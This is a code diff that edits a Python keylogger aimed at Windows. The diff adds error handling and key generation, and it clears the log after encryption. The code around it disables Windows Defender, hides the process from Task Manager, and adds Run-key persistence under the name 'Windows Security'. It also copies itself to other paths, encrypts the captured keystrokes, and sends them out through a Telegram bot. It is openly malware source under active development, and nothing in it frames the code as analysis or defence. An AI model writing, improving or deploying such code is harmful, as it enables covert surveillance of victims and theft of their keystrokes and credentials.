@@ -29,6 +29,9 @@ def disable_defender():
         logging.error(f'Error in disable_defender():{e}')
 
 disable_defender()
+result = subprocess.run(["powershell", "-Command", cmd], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+if result.returncode != 0:
+    logging.error(f"Command failed: {cmd}")
 
 # Hide from Task Manager
 def hide_process():
@@ -50,7 +53,7 @@ def make_persistent():
         winreg.SetValueEx(key, "Windows Security", 0, winreg.REG_SZ, exe_path)
         winreg.CloseKey(key)
     except Exception as e:
-        pass
+        logging.error(f'Error in make_persistent():{e}')
 
 make_persistent()
 
@@ -67,19 +70,32 @@ def spread_keylogger():
 
     for path in paths:
         try:
-            shutil.copy(exe_path, path)
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, os.path.basename(path), 0, winreg.REG_SZ, path)
-            winreg.CloseKey(key)
-        except Exception:
-            pass
+            if not os.path.exists(path):
+                shutil.copy(exe_path, path)
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, os.path.basename(path), 0, winreg.REG_SZ, path)
+                winreg.CloseKey(key)
+        except Exception as e:
+            logging.error(f'Error in spread_keylogger: {e}')
 
 spread_keylogger()
 
 # Load encryption key
 def load_key():
-    return open("secret.key", "rb").read()
+    key_path = "secret.key"
+    try:
+        if not os.path.exists(key_path):
+            # Generate a new key if it doesn't exist
+            key = Fernet.generate_key()
+            with open(key_path, "wb") as key_file:
+                key_file.write(key)
+        # Read and return the key
+        return open(key_path, "rb").read()
+    except Exception as e:
+        logging.error(f"Error in load_key(): {e}")
+        raise  # Re-raise the exception to stop execution if the key cannot be loaded
 
+# Load the key and create a Fernet cipher object
 key = load_key()
 cipher = Fernet(key)
 
@@ -87,12 +103,23 @@ LOG_FILE = "keylog.txt"
 BOT_TOKEN = "your_telegram_bot_token"
 CHAT_ID = "your_chat_id"
 
+# Configure logging
 logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 def encrypt_log():
-    with open(LOG_FILE, "rb") as file:
-        data = file.read()
-    return cipher.encrypt(data).decode()
+    try:
+        with open(LOG_FILE, "rb") as file:
+            data = file.read()
+        if not data:
+            logging.warning("Log file is empty.")
+            return None
+        encrypted_data = cipher.encrypt(data)
+        with open(LOG_FILE, "w") as file:
+            file.write("")  # Clear the log file
+        return encrypted_data.decode()
+    except Exception as e:
+        logging.error(f"Error in encrypt_log(): {e}")
+        return None
 
 def send_telegram():
     while True:
